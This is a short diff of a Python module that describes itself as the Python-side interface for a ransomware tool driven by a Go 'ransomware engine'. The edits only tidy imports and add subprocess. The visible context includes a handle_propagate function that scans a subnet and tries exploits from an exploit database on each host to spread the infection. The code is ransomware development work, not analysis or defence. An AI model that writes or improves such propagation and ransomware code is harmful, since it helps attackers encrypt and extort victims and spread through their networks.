@@ -4,15 +4,10 @@ Provides the Python-side interface for ransomware operations.
 Integrates with the Go ransomware engine via the bridge IPC protocol.
 """
 
-import json
 import os
 import re
 import base64
-import hashlib
-import struct
-import tempfile
-from datetime import datetime
-from typing import Any
+import subprocess
 
 
 def register_routes(registry: dict) -> None:
@@ -362,7 +357,8 @@ def handle_propagate(params: dict) -> dict:
             parts = subnet.split(".")
             prefix = f"{parts[0]}.{parts[1]}.{parts[2]}"
             cidr_bits = int(subnet.split("/")[1]) if "/" in subnet else 24
-            import socket, threading
+            import socket
+            import threading
 
             def scan_host(ip, results):
                 for port, exploit_info in exploit_db.items():
